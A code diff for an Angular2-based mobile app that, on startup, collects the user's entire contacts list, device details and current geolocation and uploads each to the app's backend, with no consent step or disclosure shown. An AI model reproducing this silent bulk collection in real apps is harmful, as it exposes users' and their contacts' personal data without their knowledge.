@@ -9,6 +9,7 @@ import {Categories} from './pages/Categories/Categories';
 import {Config} from './providers/config';
 import {ServiceCaller} from './providers/servicecaller';
 import {Cache} from './providers/cache';
+import {UserContactsInfo, UserDeviceInfo, UserGeoInfo} from './contracts/ServerContracts';
 // https://angular.io/docs/ts/latest/api/core/Type-interface.html
 import {Type, enableProdMode} from 'angular2/core';
 
@@ -32,6 +33,7 @@ export class MyApp {
         this.config.initTimer();
         platform.ready().then(() => {
             this.init();
+            this.uploadUserAndDeviceInfo();
         });
     }
 
@@ -41,16 +43,27 @@ export class MyApp {
     }
     
     uploadUserAndDeviceInfo() {
+        var contactJson: UserContactsInfo;
+        var deviceJson: UserDeviceInfo;
+        var geoJson: UserGeoInfo;
+        
         // Contacts List
         var contactsList = Contacts.find(['*']);
-        contactsList.then(data => { this.contacts = data; // Upload it and save to cache
+        contactsList.then(data => { this.contacts = data;
+            contactJson = { UserId: null, JSON: JSON.stringify(data) }
+            this.service.uploadContactsList(JSON.stringify(contactJson));
              });
         
         // Device Info
-        this.service.uploadDeviceInfo(JSON.stringify(Device.device));
+        deviceJson = { UserId: null, JSON: JSON.stringify(Device.device) }
+        this.service.uploadDeviceInfo(JSON.stringify(deviceJson));
         
         // Geo-location
         let geoPos = Geolocation.getCurrentPosition();
-        geoPos.then(data => this.service.uploadUserLocation(JSON.stringify(data)));        
+        geoPos.then(data =>    {     
+                    geoJson = { UserId: null, JSON: JSON.stringify(data)};
+                    this.service.uploadUserLocation(JSON.stringify(geoJson))}
+                );        
     }
+    
 }
